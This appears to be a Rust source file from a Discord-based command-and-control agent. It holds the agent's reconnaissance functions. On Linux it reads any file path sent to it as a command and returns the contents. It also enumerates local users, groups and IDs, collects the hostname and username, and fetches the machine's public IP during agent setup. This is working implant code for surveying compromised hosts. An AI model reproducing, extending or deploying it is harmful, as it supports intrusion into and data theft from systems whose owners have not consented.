use std::env;
#[cfg(target_os = "linux")]
use std::{ fs, path::Path };

use public_ip_addr::get_public_ip;
use sysinfo::{ System, SystemExt, UserExt };
use ansi_term::Colour;

use crate::errors::DiscordC2Error;
use crate::formatted_ansi;

#[derive(Debug)]
pub enum ReconType {
    #[cfg(target_os = "linux")]
    Linux,
    #[cfg(target_os = "windows")]
    Windows,
    Agnostic,
}

/// Runs a recon command given the command and the ReconType
///
/// ### Returns
/// Returns a String representation containing the result of the command.
pub fn run_recon(command: &str, recon_type: ReconType) -> String {
    match recon_type {
        #[cfg(target_os = "linux")]
        ReconType::Linux => {
            // For now, this is okay. As we expand linux commands, we will have to do pattern matching. Example below for Agnostic type.
            let path = Path::new(&command);
            return fs::read_to_string(path).unwrap_or("Unknown".to_string());
        }

        #[cfg(target_os = "windows")]
        ReconType::Windows => {
            // No windows specific commands at this time
            return "not supported".to_string();
        }

        ReconType::Agnostic => {
            match command {
                "userlist" => {
                    return sys_info(command);
                }
                _ => {
                    return "Unknown command".to_string();
                } /* this is really not necessary unless we made a coding mistake, but including it for POC */
            }
        }
    }

    fn sys_info(command: &str) -> String {
        let mut sys = System::new_all();
        sys.refresh_all();

        let mut output = String::new();

        match command {
            "userlist" => {
                for user in sys.users() {
                    
                    let label_color = Colour::Blue.bold();
                    let value_color = Colour::Cyan;
                

                    let user_info = format!(
                        "{} || {} || {}",
                        formatted_ansi!(
                            label_color, // Label color
                            value_color, // Value color
                            "User: ",
                            user.name().to_string()
                        ),
                        formatted_ansi!(
                            label_color, // Label color
                            value_color, // Value color
                            "Groups: ",
                            format!("{:?}", user.groups())
                        ),
                        formatted_ansi!(
                            label_color, // Label color
                            value_color, // Value color
                            "UID: ",
                            user.id().to_string()
                        )
                    );
                    output.push_str(&user_info);

                    // On Windows, this value defaults to 0, and as such there is no need to display this in the output.
                    #[cfg(target_os = "linux")]
                    output.push_str(
                        &format!(
                            " || {}",
                            formatted_ansi!(
                                label_color,
                                value_color,
                                "GID: ",
                                user.group_id().to_string()
                            )
                        )
                    );

                    output.push('\n');
                }
                output
            }
            _ => String::from("Command not supported yet"),
        }
    }
}

/// Retrieves the user information used during agent initialization.
///
/// This function is used by the `get_or_create_agent` function in the `agent.rs` file
/// to fetch the domain and username of the current user.
///
/// # Returns
///
/// A `String` containing the user information in the format "domain:user".
#[cfg(target_os = "windows")]
pub fn user() -> String {
    let domain = env::var("USERDOMAIN").unwrap_or("Unknown Hostname".to_string());
    let user = env::var("USERNAME").unwrap_or("Unknown User".to_string());

    format!("{}:{}", &domain, &user)
}

#[cfg(target_os = "linux")]
pub fn user() -> String {
    // linux does not really have a concept of AD domains, just return the hostname
    // from /etc/hostname which usually has a FQDN
    let binding = fs
        ::read_to_string(Path::new("/etc/hostname"))
        .unwrap_or("Unknown Hostname".to_string());
    let hostname = binding.trim(); // /etc/hostname has a newline at EOF, need to trim it
    let user = env::var("USER").unwrap_or("Unknown User".parse().unwrap());

    format!("{}:{}", &hostname, &user)
}

/// Retrieves the public IP address during agent initialization.
///
/// This function is used by the `get_or_create_agent` function in the `agent.rs` file
/// to fetch the public IP address of the agent.
///
/// # Returns
///
/// The public IP address as a `String`, or an `Err` of type `DiscordC2Error` if there was an error.
pub async fn ip() -> Result<String, DiscordC2Error> {
    let ip = get_public_ip().await.map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
    Ok(ip)
}